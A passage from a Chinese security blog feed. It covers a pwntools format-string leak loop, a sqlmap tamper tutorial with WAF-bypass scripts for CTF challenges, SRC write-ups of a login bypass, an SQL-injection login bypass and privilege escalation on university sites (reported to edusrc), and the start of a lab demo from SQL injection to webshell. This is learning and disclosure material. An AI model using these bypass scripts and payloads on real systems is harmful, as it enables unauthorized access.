<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;error&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">payload</span>):</span></span><br><span class="line">    sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">8887</span>)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    data = sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> data.startswith(<span class="string">&#x27;0x&#x27;</span>):</span><br><span class="line">        <span class="keyword">print</span> p64(int(data, <span class="number">16</span>))</span><br><span class="line">    sh.close()</span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    payload = <span class="string">&#x27;%&#123;&#125;$p&#x27;</span>.format(i)</span><br><span class="line">    leak(payload)</span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure>
<h2 id="结语"><a class="header-anchor" href="#结语">¶</a>结语</h2>
<p>up！up！up！</p>
<blockquote>
<p>参考链接：<br>
<a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/</a><br>
<a href="https://www.yuque.com/hxfqg9/bin/aedgn4">https://www.yuque.com/hxfqg9/bin/aedgn4</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap-tamper编写初体验</title>
    <url>/posts/3501/</url>
    <content><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
<p>最近做ctf题，到了编写tamper脚本的阶段，写一篇基础浅薄的文章记录一下，新手如何上手tamper脚本的编写</p>
<h2 id="介绍"><a class="header-anchor" href="#介绍">¶</a>介绍</h2>
<p>tamper的出现是为了引入用户自定义的脚本来修改payload以达到绕过waf的目的，而tamper文件在sqlmap文件夹下的tamper文件夹中。我们取一个<code>base64encode.py</code>文件来观察其结构</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2021 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.convert <span class="keyword">import</span> encodeBase64</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> encodeBase64(payload, binary=<span class="literal">False</span>) <span class="keyword">if</span> payload <span class="keyword">else</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以看到，分别有<code>import</code>、<code>__priority__</code>属性、<code>dependencies</code>函数和<code>tamper</code>函数</p>
<h3 id="import"><a class="header-anchor" href="#import">¶</a>import</h3>
<p>这一部分不用多说大家也都知道，就是导入python库或者sqlmap的内部库。其中sqlmap为我们封装了很多函数，我们可以在lib文件中的core文件夹查看。</p>
<h3 id="priority"><a class="header-anchor" href="#priority">¶</a>priority</h3>
<p>PRIORITY是从slqmap自己封装的库中导入，我们去查看enums.py文件可以看到以下内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PRIORITY</span>(<span class="params">object</span>):</span></span><br><span class="line">    LOWEST = <span class="number">-100</span></span><br><span class="line">    LOWER = <span class="number">-50</span></span><br><span class="line">    LOW = <span class="number">-10</span></span><br><span class="line">    NORMAL = <span class="number">0</span></span><br><span class="line">    HIGH = <span class="number">10</span></span><br><span class="line">    HIGHER = <span class="number">50</span></span><br><span class="line">    HIGHEST = <span class="number">100</span></span><br></pre></td></tr></table></figure>
<p>这里是定义优先级的意思，如果有多个tamper脚本同时使用，会按照优先级顺序进行先后调用</p>
<h3 id="dependencies"><a class="header-anchor" href="#dependencies">¶</a>dependencies</h3>
<p>dependencies的作用主要是进行提示，上述案例没有作提示就用了pass跳过，我们写个简单提示的例子</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> lib.core.convert <span class="keyword">import</span> encodeBase64</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    singleTimeWarnMessage(<span class="string">&quot;我是提示哦，这个tamper的作用是进行base64编码&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> encodeBase64(payload, binary=<span class="literal">False</span>) <span class="keyword">if</span> payload <span class="keyword">else</span> payload</span><br></pre></td></tr></table></figure>
<p>然后在tamper文件夹下保存成<code>dotast.py</code>，以<code>--tamper=dotast</code>的方式引用<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/sqlmap-tamper%E7%BC%96%E5%86%99%E5%88%9D%E4%BD%93%E9%AA%8C/R52GSK9JAVUG_KVAVRKAR62.png" alt=""><br>
可以看到弹出了我们编写的提示</p>
<h3 id="tamper"><a class="header-anchor" href="#tamper">¶</a>tamper</h3>
<p>tamper函数是整个tamper脚本的核心，你想实现的功能都写在此函数里边。他有两个参数，一个是payload，一个是kwargs。payload是sqlmap的注入payload，想要bypass绕过就对此修改；kwargs是对于http头部的修改。</p>
<h2 id="编写案例"><a class="header-anchor" href="#编写案例">¶</a>编写案例</h2>
<h3 id="案例一"><a class="header-anchor" href="#案例一">¶</a>案例一</h3>
<p>这里举例ctfshow的web208题<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/sqlmap-tamper%E7%BC%96%E5%86%99%E5%88%9D%E4%BD%93%E9%AA%8C/A_O%6028%2499%605SCVX%25ND9%28193.png" alt=""></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line"><span class="comment">// $id = str_replace(&#x27;select&#x27;, &#x27;&#x27;, $id);</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">   <span class="keyword">return</span> preg_match(<span class="string">&#x27;/ /&#x27;</span>, $str);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>可以看到waf的逻辑是ban了小写select和空格,我们编写对应绕过的tamper脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    singleTimeWarnMessage(<span class="string">&quot;绕过小写select和空格&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(payload)):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;把空格替换成注释符绕过&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> payload[i]== <span class="string">&quot; &quot;</span>:</span><br><span class="line">            result +=<span class="string">&quot;/**/&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result +=payload[i]</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;小写替换成大写,这一步可以不用，因为slqmap默认payload就是大写的&quot;&quot;&quot;</span></span><br><span class="line">    result = result.replace(<span class="string">&quot;select&quot;</span>,<span class="string">&quot;SELECT&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>我们再引入编写好的<code>dotast.py</code><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/sqlmap-tamper%E7%BC%96%E5%86%99%E5%88%9D%E4%BD%93%E9%AA%8C/IA%5DK%5D0YW2%28I4NOF3O_P%7B86S.png" alt=""></p>
<h3 id="案例二"><a class="header-anchor" href="#案例二">¶</a>案例二</h3>
<p>再举例ctfshow的web210题<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/sqlmap-tamper%E7%BC%96%E5%86%99%E5%88%9D%E4%BD%93%E9%AA%8C/F5FJ61UXLCJJ%7DAS9DKP10%5BM.png" alt=""><br>
waf逻辑如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对查询字符进行解密</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params">$id</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> strrev(base64_decode(strrev(base64_decode($id))));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>可以看见是套娃的base64编码和字符串反转，我们按照他的逻辑反着写tamper脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    singleTimeWarnMessage(<span class="string">&quot;别套了别套了&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = retVal.encode()</span><br><span class="line">        retVal = retVal[::<span class="number">-1</span>]</span><br><span class="line">        retVal = base64.b64encode(retVal)</span><br><span class="line">        retVal = retVal[::<span class="number">-1</span>]</span><br><span class="line">        retVal = base64.b64encode(retVal)</span><br><span class="line">        retVal = retVal.decode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure>
<p>然后再引入写好的tamper脚本<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/sqlmap-tamper%E7%BC%96%E5%86%99%E5%88%9D%E4%BD%93%E9%AA%8C/2J%60XSKK%25_8G2R%5B%40QHZ5%299ES.png" alt=""></p>
<h2 id="结语"><a class="header-anchor" href="#结语">¶</a>结语</h2>
<p>道阻且长，加油吧！</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>src漏洞挖掘实战</title>
    <url>/posts/24632/</url>
    <content><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
<p>好久没更新博客了，消失了快两个礼拜，去尝试摸了一下edusrc。本来打算弄个证书，但好像证书站简单的漏洞都被大师傅们给挖没了，一直出不来洞，QAQ…开篇文章打算慢慢记一下一些有趣的实战（文中所有提到的漏洞已提交给edusrc平台），整个过程需要脱敏，所以马赛克是避免不了的，大家将就看看啦~</p>
<h2 id="实战"><a class="header-anchor" href="#实战">¶</a>实战</h2>
<h3 id="登录逻辑漏洞"><a class="header-anchor" href="#登录逻辑漏洞">¶</a>登录逻辑漏洞</h3>
<p>开始了开始了，逛了逛发现一个后台，尝试弱口令登录，admin/123456一套怼上去<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/1.png" alt=""><br>
坑爹的是发现居然点击登录框没有反应，没有响应对应的请求，右键源码查看一下登录框这里的代码<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/2.png" alt=""><br>
好家伙，居然只是披着一层登录按钮的皮<br>
<a href="https://imgtu.com/i/6vxGkD"><img src="https://z3.ax1x.com/2021/03/26/6vxGkD.gif" alt="6vxGkD.gif"></a></p>
<p>继续翻看源码，看见登录处理的逻辑，并且发现逻辑校验登录成功后会跳转到<code>main.php</code><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/3.png" alt=""><br>
心中一喜，可能有戏，直接url换成<code>main.php</code>访问<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/4.png" alt=""><br>
但进去后，马上弹了一个框又给我踢了出来<br>
<a href="https://imgtu.com/i/6xSOw6"><img src="https://z3.ax1x.com/2021/03/26/6xSOw6.jpg" alt="6xSOw6.jpg"></a><br>
我们抓包看看，猜测应该有个文件是校验登录的<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/5.png" alt=""><br>
抓包<code>main.php</code>，放包后，果然看见了一个<code>session.php</code>，这应该是校验登录结果的文件，我们右键抓一个<code>session.php</code>的返回包<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/6.png" alt=""><br>
看见了返回的登录结果，解码一下是刚刚弹的框的文字<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/7.png" alt=""><br>
见证奇迹的时候到了，我们把后面的errMsg给删除，然后把false改成true，这波我单走一个true给你<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/8.png" alt=""><br>
接着我们放包，成功进来了后台<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/9.png" alt=""><br>
<a href="https://imgtu.com/i/6xSAG4"><img src="https://z3.ax1x.com/2021/03/26/6xSAG4.jpg" alt="6xSAG4.jpg"></a></p>
<p>告辞，水完一篇了~</p>
<h3 id="随笔"><a class="header-anchor" href="#随笔">¶</a>随笔</h3>
<p>2021年3月11号开始，笔者第一次接触src漏洞挖掘，下面贴图的是第一个漏洞通过审核收到的邮件<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%9A%8F%E7%AC%94/O5P%5BCHZ0M1%24%7D%7D6XZ7R%403LBJ.png" alt=""><br>
接下来，就是磕磕绊绊的尝试挖掘更多的站点，在4月份4号的时候终于成功拿到了属于自己的证书，完成了自己定的一个月内拿到证书的目标，很开心。<br>
有证书的学校站点开了这么久，被一个又一个大师傅光顾了这么多次并且提交了大量漏洞，能再找到洞对我来说实属不易，过程坎坎坷坷，但终于还是完成了目标，现在心情好了起来，继续更新嘿嘿！<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%40%5B%60%7BFZQHOQ6EI%5BY95%60AJT%25F.png" alt=""></p>
<h3 id="可惜的sql注入漏洞"><a class="header-anchor" href="#可惜的sql注入漏洞">¶</a>可惜的sql注入漏洞</h3>
<p>还是逛逛又到了一个后台，熟悉的一套弱口令打上去，失败了</p>
<p><a href="https://imgtu.com/i/c8IEmn"><img src="https://z3.ax1x.com/2021/04/07/c8IEmn.gif" alt="c8IEmn.gif"></a></p>
<p>随手再测一个单引号<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E5%8F%AF%E6%83%9C%E7%9A%84sql%E6%B3%A8%E5%85%A5/2PC%7D%29LWZ2EE5VW72CJ%28%60KFS.png" alt=""><br>
好兄弟，出奇迹了<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E5%8F%AF%E6%83%9C%E7%9A%84sql%E6%B3%A8%E5%85%A5/U15%7BMVI%5D%5DDQ6C%24_Z%284BIX_0.png" alt=""><br>
这百分之99.9存在sql注入啊<br>
<a href="https://imgtu.com/i/c8O5TJ"><img src="https://z3.ax1x.com/2021/04/07/c8O5TJ.gif" alt="c8O5TJ.gif"></a><br>
嘿嘿，尝试一波万能密码登录<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E5%8F%AF%E6%83%9C%E7%9A%84sql%E6%B3%A8%E5%85%A5/A968%25S4%7DL%7B~0I2X%249T%29P2RM.png" alt=""><br>
<a href="https://imgtu.com/i/c8X8nU"><img src="https://z3.ax1x.com/2021/04/07/c8X8nU.jpg" alt="c8X8nU.jpg"></a><br>
有waf，看起来是老版本的D盾，fuzz一下<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E5%8F%AF%E6%83%9C%E7%9A%84sql%E6%B3%A8%E5%85%A5/2S8_O%24V%5DXZFELN7%7DCEFIGRB.png" alt=""><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E5%8F%AF%E6%83%9C%E7%9A%84sql%E6%B3%A8%E5%85%A5/%5B6%5B4FBGB%28LXA5T8SEF%29%251YH.png" alt=""><br>
结果是把<code>=</code>和<code>-</code>都给ban了，总结了一下信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">网站数据库为sqlserver</span><br><span class="line">fuzz出sql语句应该是</span><br><span class="line">select * from user where user&#x3D;&#39;&#39; and and User_role&#x3D;&#39;管理员&#39; and passwd&#x3D;&#39;&#39;</span><br></pre></td></tr></table></figure>
<p>在网上找了一些姿势都没利用成功，无奈只好闭合语句尝试fuzz一波密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x3D;号被waf拦截的话用like替代</span><br><span class="line">语句也就是&#39;or&#39;1&#39;like&#39;1</span><br><span class="line"></span><br><span class="line">放到sql语句里就是select * from user where user&#x3D;&#39;&#39;or&#39;1&#39;like&#39;1&#39; and and User_role&#x3D;&#39;管理员&#39; and passwd&#x3D;&#39;&#39;</span><br><span class="line"></span><br><span class="line">接着跑密码字典</span><br></pre></td></tr></table></figure>
<p>没想到，密码123就登录成功了，嘿嘿，看来网站数据库里有用户密码是123<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E5%8F%AF%E6%83%9C%E7%9A%84sql%E6%B3%A8%E5%85%A5/35b9af4c7fc405e94804e34b80cfde62_adc840d6-c7e5-42b6-846d-18212af3e7d2-ITL7TzPR.png" alt=""><br>
但可惜的是，在审核期间，网站就被学校管理员关站了，导致审核不通过；但总归还是好的，又成功减少了一个网络危害</p>
<h3 id="随笔2"><a class="header-anchor" href="#随笔2">¶</a>随笔2</h3>
<p>最近很忙，以至于博客很久也没有来更新，今天省hw结束了，随即打算更新一下文章；思绪从哪里开始讲起呢？从3月份中旬开始学习漏洞挖掘开始吧，一开始其实没有打算先接触src漏洞挖掘，因为觉得自己还需要更多知识来沉淀自己，但为了在4月底的省hw拿个好名次，也就不得不开始去学习一下，好在结果还算满意，最后离结束只剩几个小时的时候用三个0day埋伏了一手，稳稳拿下了省hw高校第一；想起这一个月的学习，还是蛮惊讶的，发现自己在一个月的时间陆陆续续获得了上海交通大学、同济大学、兰州大学、南开大学、东北林业大学、常熟理工、上海外国语等学校颁发的漏洞证书，下面贴几张已经收到的图片吧<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%9A%8F%E7%AC%942/IMG20210924232613.jpg" alt=""><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%9A%8F%E7%AC%942/IMG_20210414_114939.jpg" alt=""><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%9A%8F%E7%AC%942/qq_pic_merged_1619838122349.jpg" alt=""></p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%9A%8F%E7%AC%942/qq_pic_merged_1619838030290.jpg" alt=""></p>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%9A%8F%E7%AC%942/qq_pic_merged_1619837999884.jpg" alt=""></p>
<p>到底还是最后逼了自己一把，还是那句话，有付出才会有收获；后面估计很长一段时间不会再进行src的漏洞挖掘了，打算把精力转向基础知识的学习</p>
<h3 id="逻辑漏洞-垂直越权"><a class="header-anchor" href="#逻辑漏洞-垂直越权">¶</a>逻辑漏洞-垂直越权</h3>
<p>这个洞纯属偶然，在刷手机的时候，无意发现的学校的网址，用电脑访问了之后是一个登录页面<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/%60JOP7W%7D%29%5B7%40E_%24U6D0LG~G6.png" alt="">可以注册，注册了一个账号<br>
账号：3150103968<br>
密码：12345678<br>
然后登陆，进去是普通的用户权限<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/JQFF554I%5BK%40VMAB1VMC_%60SC.png" alt=""><br>
然后退出登录，回到登录框这里，用burpsuite抓取登录的数据包<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/MFP1%28PB5%7B~%40_J4I5S%25S~SIQ.png" alt=""><br>
抓取返回包进行观察，发现一个控制用户权限的字段<code>userPermission</code>，这里是user<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/%28%24A%29GMXU%25%285%7B667%5B%28ZK%60A4U.png" alt=""><br>
我们把他改成admin，然后发送数据包<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/Z%7BW0ERG%25MS5NJAQZ%24WK%24WBK.png" alt=""><br>
登录成功后，发现拥有了管理员的权限<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/9ATRN%28%247%29R7%7DNS%7DKY7%25MI%7DR.png" alt=""></p>
]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>模拟网站攻击到提权的全部过程</title>
    <url>/posts/46463/</url>
    <content><![CDATA[<h1>前言</h1>
<p>今天去给新一届的学生演示一次网站拿webshell到系统提权的过程，但不幸的是中间翻车了，老年人紧张得忘记了msf监听木马的指令，然后哆哆嗦嗦的在大家眼下，打开了笔记查看一下2333…所以更新一下博客，给自己一个教训QWQ。</p>
<h1>准备工作</h1>
<p>靶机（被攻击方）：win7系统<br>
入侵者（攻击方）：win10系统、kali系统</p>
<p>首先启动win7系统，搭建一个常见的校园网站，然后映射到局域网，使得我们能正常访问<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/EUAM0%5DFV1UHQ43O%246FPAM11.png" alt=""></p>
<h1>从网站拿到webshell</h1>
<h2 id="sql注入漏洞"><a class="header-anchor" href="#sql注入漏洞">¶</a>sql注入漏洞</h2>
<p>把整个网站浏览完一遍后，我们发现这里的url为?id=10结尾，我们猜测可能是一个sql注入点<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/%24%28BBF9%7B%40%60VK%5DJ5YB59PLDC8.png" alt=""><br>
首先我们在id=10后面加上一个单引号’进行判断<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/%7DR0SQC6%40%25D0%24UCQD%28%7B_JBJB.png" alt=""><br>
这个时候我们发现回显的数据不正常，于是我们再加一个注释符号<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/EY%24%60%7BQF%5BOL_7B%7D1490~0NFR.png" alt=""><br>
发现数据这个时候回显的时候是正常的，到这一步我们已经可以确定这里存在一个sql注入漏洞</p>
<blockquote>
<p>原理我们可以简单解释一下<br>
在网站中，我们一般使用数据库存储网站数据，网站和数据库是存在一个交互性。网站所呈现的内容是由代码中写入的sql语句调用数据库中的内容进行一个呈现，例如我们刚刚看到的文字。<br>
而sql注入漏洞一般是由于程序员书写的sql语句不规范所导致的安全事件。</p>
</blockquote>
<p>例如网站源码中使用如下的sql语句进行查询<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/1T2AQDR%295S%5B5%5D5%28FBQV%29EU3.png" alt=""><br>
给语句结尾的where查询条件加上一个单引号’<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/9YFRLV58FSE9%605E%405%7B3F_%25W.png" alt=""><br>
很显然，我们传入的单引号和前面的单引号闭合，后面只有一个无法成对的单引号，然后报了语法错误。这个时候我们再加上<code>--+</code>注释符号注释掉后面的单引号<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/GSUAC7X6IS9%40_SDTJL%5DO4%60J.png" alt=""><br>
这个时候查询的数据就会正确回显出来。</p>
<p>原理简单解释了一下之后，我们回到刚刚的网站。<br>
